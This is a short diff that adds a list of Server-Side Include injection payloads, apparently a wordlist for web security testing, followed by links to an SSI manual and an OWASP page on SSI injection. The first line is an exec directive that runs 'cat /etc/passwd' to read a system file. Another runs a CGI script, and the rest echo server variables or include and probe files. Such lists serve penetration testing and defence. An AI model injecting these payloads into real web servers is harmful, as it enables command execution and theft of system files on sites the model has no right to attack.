@@ -1,0 +1,13 @@
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cgi="/cgi-bin/hits.pl"-->
+<!--#echo var="DOCUMENT_URI" -->
+<!--#echo var="DOCUMENT_NAME"-->
+<!--#echo var="LAST_MODIFIED"-->
+<!--#flastmod file="main.php"-->
+<!--#fsize file="main.php"-->
+<!--#include file="main.html"-->
+
+
+# http://www.comptechdoc.org/independent/web/cgi/ssimanual/
+# https://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injection
+
